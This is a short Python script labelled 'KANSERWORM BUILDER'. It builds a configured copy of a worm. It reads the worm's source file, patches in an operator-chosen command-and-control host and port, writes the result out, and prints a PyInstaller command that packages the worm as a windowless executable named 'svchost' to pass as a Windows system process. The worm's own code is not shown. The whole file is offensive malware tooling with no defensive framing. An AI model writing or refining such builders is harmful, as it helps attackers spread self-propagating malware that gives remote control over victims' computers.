#!/usr/bin/env python3
# KANSERWORM BUILDER — Build worm EXE
import os, sys, socket

def build(c2_host=None, c2_port=7777):
    if not c2_host:
        c2_host = input("C2 IP: ").strip() or socket.gethostbyname(socket.gethostname())
    with open("core.py", "r", encoding="utf-8") as f: src = f.read()
    src = src.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{c2_host}"')
    src = src.replace('C2_PORT = 7777', f'C2_PORT = {c2_port}')
    with open("worm_built.py", "w", encoding="utf-8") as f: f.write(src)
    print(f"[+] worm_built.py — C2: {c2_host}:{c2_port}")
    print("[+] pyinstaller --onefile --noconsole --name=svchost worm_built.py")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(); p.add_argument("--host"); p.add_argument("--port", type=int, default=7777)
    a = p.parse_args(); build(a.host, a.port)
